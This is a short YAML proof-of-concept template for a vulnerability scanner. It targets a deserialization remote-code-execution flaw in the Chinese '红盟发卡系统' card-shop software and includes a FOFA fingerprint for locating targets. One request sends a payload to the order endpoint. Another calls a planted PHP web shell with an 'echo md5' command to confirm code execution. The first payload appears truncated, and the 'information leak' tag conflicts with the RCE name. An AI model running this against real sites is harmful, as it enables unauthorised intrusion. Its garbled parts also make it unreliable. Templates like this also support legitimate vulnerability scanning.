id: poc-yaml-hm-faka-ordercontent-unserialize-rce
info:
  name: 红盟发卡系统 order/orderContent 反序列化漏洞
  severity: critical
  tags:
  - 信息泄露
  finger: 红盟云卡系统
  fofa: /assets/shop/dist/uaredirect.js?v=1.2.0
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /shop/order/orderContent?order_no=123
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: search_
  expression: "status_code == 500 && \ncontains(title,\"System Error\")\n"
- method: POST
  path: /feng.php3b58a9545013e88c7186db11bb158c44.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: feng=echo%20md5({{.t1}});
  expression: "status_code == 200 && \ncontains(body,t2)\n"
transport: http
